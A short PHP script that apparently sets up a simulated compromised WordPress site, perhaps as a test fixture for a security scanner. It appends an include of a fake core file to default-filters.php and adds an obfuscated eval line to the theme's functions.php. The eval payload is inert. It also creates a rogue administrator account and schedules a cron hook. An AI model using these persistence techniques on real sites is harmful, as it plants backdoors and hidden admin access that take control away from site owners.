<?php
require_once '/wordpress/wp-load.php';

// 1. Change a core file so it loads the fake one on every page.
file_put_contents( ABSPATH . WPINC . '/default-filters.php', "\ninclude_once ABSPATH . WPINC . '/class-wp-cache-helper.php';\n", FILE_APPEND );

// 2. Hide code in the active theme.
$functions = get_stylesheet_directory() . '/functions.php';
if ( ! file_exists( $functions ) ) {
    file_put_contents( $functions, "<?php\n" );
}
file_put_contents( $functions, "\n@eval( base64_decode( 'cmV0dXJuOw==' ) );\n", FILE_APPEND );

// 3. Add a rogue admin.
wp_insert_user( array(
    'user_login' => 'wp_sysadmin',
    'user_pass'  => wp_generate_password(),
    'user_email' => 'sysadmin@example.net',
    'role'       => 'administrator',
) );

// 4. Schedule the cron job the fake core file hooks into.
wp_schedule_event( time(), 'hourly', 'wp_maintenance_check' );
